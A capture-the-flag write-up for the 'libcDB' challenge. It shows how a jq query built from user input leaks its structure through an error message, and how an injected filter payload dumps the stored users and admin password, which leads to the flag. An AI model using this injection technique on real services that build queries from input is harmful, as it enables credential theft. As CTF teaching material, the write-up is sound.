### libcDB - 14 solves

Description:
```
pwning challenges without given libc can be a hussle
i made a libcDB as a service that can help resolve the libc version by symbols and their addresses
i havn't added all libc's yet, but thats enough to test it out

nc libcdb.3k.ctf.to 7777

* test account { Dead:pool }
```

When connecting to the provided address, we are given a login prompt and we can enter the credentials from the description resulting in the following prompt:

```
Authenticated {"users":{"username":"Dead","password":"pool"}}

 __    _ _       ____  _____
|  |  |_| |_ ___|    \| __  |
|  |__| | . |  _|  |  | __ -|
|_____|_|___|___|____/|_____|
                         as a service


Type .help for help



>
```

Notice the JSON at the beginning, I tried adding my own JSON, but it only allowed alphanumeric login and password.

`.help` gives us a few options to choose from:
```
.help                   Print this help
.version                Print versions
.search                 Search libcdb
.secret                 Print flag
```

Sadly, we cannot get the flag instantly by just executing the .secret command. And instead returns:
```
not admin
no flag for u
```
The `.version` command gives us some information about what libc's are added to the database:
```
"ubuntu_libc6-dbg_2.4-1ubuntu12.3_amd64"
"ubuntu_libc6-dbg_2.4-1ubuntu12_amd64"
"ubuntu_libc6-i386_2.10.1-0ubuntu15_amd64"
```


The last feature, `.search` is more of interest and has the following pattern: `.search <*symbol> <*addr> <filter>`.  
An example search is `.search fprintf 0x4b970` which gives us some nice information about the `fprintf` function:

```
> .search fprintf 0x4b970
Found:
        id              6acfaae0398dce58e1857599a274f6d8
        name            ubuntu_libc6-dbg_2.4-1ubuntu12.3_amd64
        symbol          fprintf
        address         0x4b970
Found:
        id              fc1e12693e5762252bc44256d5a72506
        name            ubuntu_libc6-dbg_2.4-1ubuntu12_amd64
        symbol          fprintf
        address         0x4b970
```

However, there is another paramater: `<filter>` and when adding a non-alphanumeric character we get an error:
```
> .search fprintf 0x4b970 "
jq: error: syntax error, unexpected $end, expecting QQSTRING_TEXT or QQSTRING_INTERP_START or QQSTRING_END (Unix shell quoting issues?) at <top-level>, line 1:
. as $maindb | .libcDB[] | select(.symbol=="fprintf") | select(.address|contains("309616")) | ."
jq: error: try .["field"] instead of .field for unusually named fields at <top-level>, line 1:
. as $maindb | .libcDB[] | select(.symbol=="fprintf") | select(.address|contains("309616")) | ."
jq: 2 compile errors
```

This gives us some more information about the application and that it uses `jq`, additionaly we get the complete query.   
After reading a bit about `jq` we can construct our own query.  
By just guessing that the object where the users are stored are in the same `$maindb` (Thanks to the JSON we got when logging in), we can create a query like this: `,{name:.[]|$maindb.users|tostring}` and leak the complete users `db`.  
(Additionally, we could leak the complete db with `,{name:.[]|$maindb|tostring}`, but it's huge).  
Final Payload: `.search fprintf 0x4b970 ,{name:.[]|$maindb.users|tostring}`. Resulting into the users object:
```json
[
    {
        "username": "3k",
        "password": "notaflag"
    },
    {
        "username": "James",
        "password": "Hetfield"
    },
    {
        "username": "Lars",
        "password": "Ulrich"
    },
    {
        "username": "Dead",
        "password": "pool"
    },
    {
        "username": "admin",
        "password": "v3ryL0ngPwC4nTgu3SS0xfff"
    },
    {
        "username": "jim",
        "password": "carrey"
    }
]
```
And so logging in with `admin:v3ryL0ngPwC4nTgu3SS0xfff`   we get the flag by the `.secret` command: `3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}`